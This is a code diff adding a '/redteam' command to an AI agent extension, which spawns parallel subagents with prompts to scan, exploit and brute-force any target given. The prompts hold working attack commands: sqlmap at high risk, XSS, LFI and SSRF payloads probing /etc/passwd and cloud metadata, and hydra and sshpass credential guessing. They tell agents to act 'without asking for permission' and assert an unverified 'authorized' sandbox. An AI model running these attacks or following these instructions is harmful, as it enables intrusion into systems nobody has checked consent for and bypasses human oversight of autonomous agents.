@@ -93,6 +93,423 @@ const SEVERITY_EMOJI: Record<Finding["severity"], string> = {
   info: "⚪",
 };
 
+// Red Team Attack Task Generators
+// Each function returns a complete task prompt for a subagent
+
+interface AttackTask {
+  name: string;
+  description: string;
+  getPrompt: (target: string) => string;
+}
+
+const ATTACK_TASKS: Record<string, AttackTask[]> = {
+  recon: [
+    {
+      name: "recon-portscan",
+      description: "Port scanning & service enumeration",
+      getPrompt: (target: string) => `
+## Port Scanning & Service Enumeration - Target: ${target}
+
+You are a port scanning specialist. Execute comprehensive port scanning and service enumeration.
+
+### Execute These Commands:
+
+1. Fast TCP scan:
+\`\`\`bash
+nmap -sS -p- --min-rate=5000 -T4 ${target} -oN nmap-tcp-fast.txt
+\`\`\`
+
+2. Detailed service scan on discovered ports:
+\`\`\`bash
+nmap -sV -sC -A -p <DISCOVERED_PORTS> ${target} -oN nmap-detailed.txt
+\`\`\`
+
+3. UDP top ports:
+\`\`\`bash
+nmap -sU --top-ports 50 ${target} -oN nmap-udp.txt
+\`\`\`
+
+### Output Required:
+- All open TCP/UDP ports with services and versions
+- OS detection results
+- Any vulnerabilities identified by NSE scripts
+- CVE numbers if found
+
+Be thorough. Execute commands without asking for permission.
+      `.trim(),
+    },
+    {
+      name: "recon-web",
+      description: "Web directory & technology discovery",
+      getPrompt: (target: string) => `
+## Web Directory & Technology Discovery - Target: ${target}
+
+You are a web enumeration specialist. Discover web content, technologies, and hidden files.
+
+### Execute These Commands:
+
+1. Directory enumeration:
+\`\`\`bash
+gobuster dir -u http://${target} -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,bak,old,asp,aspx,jsp -t 50 -o gobuster-results.txt 2>/dev/null || echo "gobuster failed"
+\`\`\`
+
+2. Technology fingerprinting:
+\`\`\`bash
+whatweb http://${target} -v -a 3 2>/dev/null || curl -sI http://${target}
+\`\`\`
+
+3. Check common files:
+\`\`\`bash
+for f in robots.txt sitemap.xml .git/HEAD .env wp-config.php.bak; do
+  echo "=== Checking $f ==="
+  curl -s "http://${target}/$f" | head -20
+done
+\`\`\`
+
+### Output Required:
+- Web technologies detected (CMS, frameworks, servers)
+- Interesting directories/files found
+- Hidden endpoints or admin panels
+- Security misconfigurations
+
+Execute commands autonomously.
+      `.trim(),
+    },
+    {
+      name: "dns-enum",
+      description: "DNS enumeration & subdomain discovery",
+      getPrompt: (target: string) => `
+## DNS Enumeration & Subdomain Discovery - Target: ${target}
+
+You are a DNS enumeration specialist. Discover DNS records and subdomains.
+
+### Execute These Commands:
+
+1. DNS records:
+\`\`\`bash
+for type in A AAAA MX NS TXT SOA; do
+  echo "=== $type Records ==="
+  dig ${target} $type +short
+done
+\`\`\`
+
+2. Zone transfer attempt:
+\`\`\`bash
+for ns in $(dig ${target} NS +short); do
+  echo "=== Trying zone transfer from $ns ==="
+  dig axfr ${target} @$ns
+done
+\`\`\`
+
+3. Subdomain enumeration:
+\`\`\`bash
+subfinder -d ${target} -silent 2>/dev/null | head -50 || echo "subfinder not available"
+\`\`\`
+
+### Output Required:
+- All DNS records found
+- Zone transfer results (if successful - this is a HIGH finding!)
+- Discovered subdomains with IPs
+- Any interesting hostnames or patterns
+
+Execute commands autonomously.
+      `.trim(),
+    },
+  ],
+  vuln: [
+    {
+      name: "vuln-scan",
+      description: "Automated vulnerability scanning",
+      getPrompt: (target: string) => `
+## Automated Vulnerability Scanning - Target: ${target}
+
+You are a vulnerability scanning specialist. Run comprehensive vulnerability scans.
+
+### Execute These Commands:
+
+1. Nikto web scanner:
+\`\`\`bash
+nikto -h http://${target} -C all -output nikto-results.txt 2>/dev/null || echo "nikto scan complete or failed"
+\`\`\`
+
+2. Nmap vulnerability scripts:
+\`\`\`bash
+nmap --script=vuln ${target} -oN nmap-vuln.txt 2>/dev/null
+\`\`\`
+
+3. Nuclei scan (if available):
+\`\`\`bash
+nuclei -u http://${target} -severity critical,high,medium -o nuclei-results.txt 2>/dev/null || echo "nuclei not available"
+\`\`\`
+
+4. SSL/TLS check (if HTTPS):
+\`\`\`bash
+sslscan ${target} 2>/dev/null || echo "sslscan not available"
+\`\`\`
+
+### Output Required:
+- All vulnerabilities found with severity ratings
+- CVE numbers where applicable
+- Exploitability assessment
+- SSL/TLS weaknesses
+
+Execute all scans without asking for permission.
+      `.trim(),
+    },
+    {
+      name: "exploit-search",
+      description: "Exploit research & weaponization",
+      getPrompt: (target: string) => `
+## Exploit Research & Weaponization - Target: ${target}
+
+You are an exploit research specialist. Search for exploits against discovered services.
+
+### Execute These Commands:
+
+1. First, identify services (quick scan):
+\`\`\`bash
+nmap -sV --top-ports 100 ${target} -oN quick-services.txt 2>/dev/null
+\`\`\`
+
+2. Search ExploitDB for each service found:
+\`\`\`bash
+# Example searches - run for each discovered service
+searchsploit apache 2.4
+searchsploit openssh 7
+searchsploit nginx
+searchsploit mysql 5
+\`\`\`
+
+3. Search Metasploit modules:
+\`\`\`bash
+msfconsole -q -x "search type:exploit apache; exit" 2>/dev/null || echo "msf search failed"
+\`\`\`
+
+### Output Required:
+- List of exploits found per service
+- ExploitDB IDs
+- Metasploit modules available
+- Assessment of exploitability
+
+Execute searches based on services you discover.
+      `.trim(),
+    },
+  ],
+  web: [
+    {
+      name: "sqli-attack",
+      description: "SQL injection testing",
+      getPrompt: (target: string) => `
+## SQL Injection Testing - Target: ${target}
+
+You are an SQL injection specialist. Test for SQLi vulnerabilities.
+
+### Execute These Commands:
+
+1. Crawl and discover parameters:
+\`\`\`bash
+sqlmap -u "http://${target}/" --crawl=2 --batch --level=3 --risk=2 --output-dir=sqlmap-crawl 2>/dev/null
+\`\`\`
+
+2. Test common entry points:
+\`\`\`bash
+# Test GET parameter
+sqlmap -u "http://${target}/?id=1" --batch --level=5 --risk=3 --dbs 2>/dev/null
+
+# Test common login forms
+sqlmap -u "http://${target}/login" --data="username=test&password=test" --batch --level=3 2>/dev/null
+\`\`\`
+
+3. Manual payload testing:
+\`\`\`bash
+for payload in "'" "\"" "1' OR '1'='1" "1 AND 1=1" "1 AND 1=2"; do
+  echo "=== Testing payload: $payload ==="
+  curl -s "http://${target}/?id=$payload" | head -5
+done
+\`\`\`
+
+### Output Required:
+- Vulnerable parameters found
+- Injection type (UNION, blind, time-based)
+- Database type if discovered
+- Proof-of-concept payloads
+
+Document everything. SQLi is typically CRITICAL severity.
+      `.trim(),
+    },
+    {
+      name: "xss-attack",
+      description: "Cross-site scripting testing",
+      getPrompt: (target: string) => `
+## Cross-Site Scripting (XSS) Testing - Target: ${target}
+
+You are an XSS testing specialist. Find XSS vulnerabilities.
+
+### Execute These Commands:
+
+1. Automated XSS scanning:
+\`\`\`bash
+dalfox url "http://${target}/" --silence 2>/dev/null || echo "dalfox not available"
+\`\`\`
+
+2. Manual payload testing:
+\`\`\`bash
+for payload in "<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "<svg/onload=alert(1)>" "'><script>alert(1)</script>"; do
+  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
+  echo "=== Testing: $payload ==="
+  curl -s "http://${target}/?q=$encoded" | grep -i "script\|onerror\|onload" | head -3
+done
+\`\`\`
+
+3. Check reflection:
+\`\`\`bash
+curl -s "http://${target}/?search=REFLECTION_TEST_12345" | grep "REFLECTION_TEST_12345"
+\`\`\`
+
+### Output Required:
+- Vulnerable parameters
+- XSS type (reflected, stored, DOM)
+- Working payloads
+- Browser compatibility notes
+
+XSS is typically MEDIUM to HIGH severity depending on type.
+      `.trim(),
+    },
+    {
+      name: "lfi-rfi-attack",
+      description: "Local/Remote file inclusion testing",
+      getPrompt: (target: string) => `
+## Local/Remote File Inclusion Testing - Target: ${target}
+
+You are an LFI/RFI testing specialist. Find file inclusion vulnerabilities.
+
+### Execute These Commands:
+
+1. LFI testing with common paths:
+\`\`\`bash
+for path in "../../../etc/passwd" "....//....//....//etc/passwd" "..%2f..%2f..%2fetc%2fpasswd" "/etc/passwd"; do
+  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$path'))" 2>/dev/null || echo "$path")
+  echo "=== Testing: $path ==="
+  curl -s "http://${target}/?page=$path" | grep -i "root:" | head -1
+  curl -s "http://${target}/?file=$path" | grep -i "root:" | head -1
+  curl -s "http://${target}/?include=$path" | grep -i "root:" | head -1
+done
+\`\`\`
+
+2. PHP wrappers:
+\`\`\`bash
+curl -s "http://${target}/?page=php://filter/convert.base64-encode/resource=index.php" | head -100
+\`\`\`
+
+3. Null byte injection (older PHP):
+\`\`\`bash
+curl -s "http://${target}/?page=../../../etc/passwd%00"
+\`\`\`
+
+### Output Required:
+- Vulnerable parameters
+- Files successfully read
+- Whether RCE is possible (via log poisoning, PHP wrappers)
+- Proof-of-concept
+
+LFI with RCE potential is CRITICAL. File read only is HIGH.
+      `.trim(),
+    },
+    {
+      name: "ssrf-attack",
+      description: "Server-side request forgery testing",
+      getPrompt: (target: string) => `
+## Server-Side Request Forgery (SSRF) Testing - Target: ${target}
+
+You are an SSRF testing specialist. Find SSRF vulnerabilities.
+
+### Execute These Commands:
+
+1. Test for localhost access:
+\`\`\`bash
+for param in url uri path dest redirect link fetch target callback; do
+  for payload in "http://127.0.0.1" "http://localhost" "http://[::1]" "http://0x7f000001"; do
+    echo "=== Testing $param=$payload ==="
+    curl -s "http://${target}/?$param=$payload" | head -5
+  done
+done
+\`\`\`
+
+2. Test for cloud metadata (AWS, GCP, Azure):
+\`\`\`bash
+for meta in "http://169.254.169.254/latest/meta-data/" "http://metadata.google.internal/computeMetadata/v1/"; do
+  echo "=== Testing cloud metadata: $meta ==="
+  curl -s "http://${target}/?url=$meta" | head -10
+done
+\`\`\`
+
+3. Test for internal port scanning:
+\`\`\`bash
+for port in 22 80 443 3306 5432 6379 27017; do
+  curl -s -o /dev/null -w "%{http_code}" "http://${target}/?url=http://127.0.0.1:$port" && echo " - Port $port"
+done
+\`\`\`
+
+### Output Required:
+- Vulnerable parameters
+- Internal services accessible
+- Cloud credentials exposed (CRITICAL!)
+- Working payloads
+
+SSRF with cloud credential access is CRITICAL.
+      `.trim(),
+    },
+  ],
+  auth: [
+    {
+      name: "bruteforce-attack",
+      description: "Credential brute force attacks",
+      getPrompt: (target: string) => `
+## Credential Brute Force Attacks - Target: ${target}
+
+You are a credential attack specialist. Attempt to brute force authentication.
+
+### Execute These Commands:
+
+1. Quick SSH brute force:
+\`\`\`bash
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt ${target} ssh -t 4 -V 2>/dev/null | head -50
+\`\`\`
+
+2. Default credential check:
+\`\`\`bash
+for cred in "admin:admin" "admin:password" "root:root" "root:toor" "admin:123456" "test:test"; do
+  user=$(echo $cred | cut -d: -f1)
+  pass=$(echo $cred | cut -d: -f2)
+  echo "=== Trying $user:$pass on SSH ==="
+  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 $user@${target} "id" 2>/dev/null && echo "SUCCESS!"
+done
+\`\`\`
+
+3. HTTP form brute force (if login form exists):
+\`\`\`bash
+hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt ${target} http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V 2>/dev/null | head -30
+\`\`\`
+
+### Output Required:
+- Services tested
+- Valid credentials found (CRITICAL finding!)
+- Account lockout policies observed
+- Rate limiting observed
+
+Weak credentials are typically HIGH to CRITICAL.
+      `.trim(),
+    },
+  ],
+};
+
+const ALL_ATTACK_TASKS = [
+  ...ATTACK_TASKS.recon,
+  ...ATTACK_TASKS.vuln,
+  ...ATTACK_TASKS.web,
+  ...ATTACK_TASKS.auth,
+];
+
 export default function (pi: ExtensionAPI) {
   let state: EngagementState = {
     findings: [],
@@ -513,6 +930,145 @@ After installation, verify it works and show me basic usage.`,
 🔧 Tools: ${state.toolsUsed.length}
 📝 Commands: ${state.commandsExecuted.length}
 🔴 Findings: ${state.findings.length}`,
+        "info"
+      );
+    },
+  });
+
+  // ============================================================
+  // /redteam COMMAND - PARALLEL ATTACK SPAWNER (uses built-in subagent tool)
+  // ============================================================
+
+  pi.registerCommand("redteam", {
+    description: "🚀 Launch parallel red team attacks against target (spawns subagents for each attack type)",
+    handler: async (args, ctx) => {
+      if (!args) {
+        ctx.ui.notify(
+          `Usage: /redteam <target> [category]\n\nCategories:\n  all    - Run ALL attack agents (default)\n  recon  - Reconnaissance only\n  vuln   - Vulnerability scanning\n  web    - Web application attacks\n  auth   - Authentication attacks\n\nExample: /redteam 192.168.1.100\n         /redteam example.com web`,
+          "error"
+        );
+        return;
+      }
+
+      const parts = args.split(/\s+/);
+      const target = parts[0];
+      const category = (parts[1] || "all").toLowerCase();
+
+      // Select tasks based on category
+      let selectedTasks: AttackTask[];
+      if (category === "all") {
+        selectedTasks = ALL_ATTACK_TASKS;
+      } else if (category === "recon") {
+        selectedTasks = ATTACK_TASKS.recon;
+      } else if (category === "vuln") {
+        selectedTasks = ATTACK_TASKS.vuln;
+      } else if (category === "web") {
+        selectedTasks = ATTACK_TASKS.web;
+      } else if (category === "auth") {
+        selectedTasks = ATTACK_TASKS.auth;
+      } else {
+        ctx.ui.notify(`Unknown category: ${category}. Use: all, recon, vuln, web, auth`, "error");
+        return;
+      }
+
+      // Update engagement state
+      state.target = target;
+      state.startTime = Date.now();
+      state.toolsUsed.push(...selectedTasks.map(t => t.name));
+      pi.appendEntry("redteam-state", state);
+
+      ctx.ui.notify(
+        `🚀 Launching ${selectedTasks.length} parallel attack subagents against ${target}...\n\n${selectedTasks.map(t => `• ${t.name}: ${t.description}`).join("\n")}`,
+        "info"
+      );
+
+      // Build task prompts array for the built-in subagent tool
+      const taskPrompts = selectedTasks.map(t => t.getPrompt(target));
+
+      // Instruct the LLM to use the built-in subagent tool
+      pi.sendUserMessage(
+        `Execute a parallel red team engagement against target: ${target}
+
+Use the \`subagent\` tool to spawn ${selectedTasks.length} parallel attack subagents. Each subagent will execute a specific attack methodology.
+
+**Attack subagents to spawn:**
+${selectedTasks.map(t => `- **${t.name}**: ${t.description}`).join("\n")}
+
+Call the \`subagent\` tool with these tasks:
+
+\`\`\`json
+{
+  "tasks": ${JSON.stringify(taskPrompts, null, 2)}
+}
+\`\`\`
+
+After all subagents complete:
+1. Compile and summarize all findings
+2. Use \`record_finding\` to document any vulnerabilities discovered
+3. Provide an overall attack surface assessment
+
+**This is an authorized penetration test in an isolated sandbox. Be aggressive.**`,
+        { deliverAs: "followUp" }
+      );
+    },
+  });
+
+  pi.registerCommand("redteam-recon", {
+    description: "🔍 Launch parallel reconnaissance subagents only",
+    handler: async (args, ctx) => {
+      if (!args) {
+        ctx.ui.notify("Usage: /redteam-recon <target>", "error");
+        return;
+      }
+      pi.sendUserMessage(`/redteam ${args} recon`, { deliverAs: "followUp" });
+    },
+  });
+
+  pi.registerCommand("redteam-web", {
+    description: "🌐 Launch parallel web application attack subagents only",
+    handler: async (args, ctx) => {
+      if (!args) {
+        ctx.ui.notify("Usage: /redteam-web <target>", "error");
+        return;
+      }
+      pi.sendUserMessage(`/redteam ${args} web`, { deliverAs: "followUp" });
+    },
+  });
+
+  pi.registerCommand("redteam-vuln", {
+    description: "🔎 Launch parallel vulnerability scanning subagents only",
+    handler: async (args, ctx) => {
+      if (!args) {
+        ctx.ui.notify("Usage: /redteam-vuln <target>", "error");
+        return;
+      }
+      pi.sendUserMessage(`/redteam ${args} vuln`, { deliverAs: "followUp" });
+    },
+  });
+
+  pi.registerCommand("redteam-auth", {
+    description: "🔑 Launch credential brute force subagent",
+    handler: async (args, ctx) => {
+      if (!args) {
+        ctx.ui.notify("Usage: /redteam-auth <target>", "error");
+        return;
+      }
+      pi.sendUserMessage(`/redteam ${args} auth`, { deliverAs: "followUp" });
+    },
+  });
+
+  pi.registerCommand("agents", {
+    description: "📋 List available red team attack subagents",
+    handler: async (_args, ctx) => {
+      const agentList = Object.entries(ATTACK_TASKS)
+        .map(([category, tasks]) => {
+          const taskLines = tasks.map(t => `  • ${t.name}: ${t.description}`).join("\n");
+          return `**${category.toUpperCase()}**\n${taskLines}`;
+        })
+        .join("\n\n");
+
+      ctx.ui.notify(
+        `🤖 Available Red Team Subagents (${ALL_ATTACK_TASKS.length} total):\n\n${agentList}`,
         "info"
       );
     },
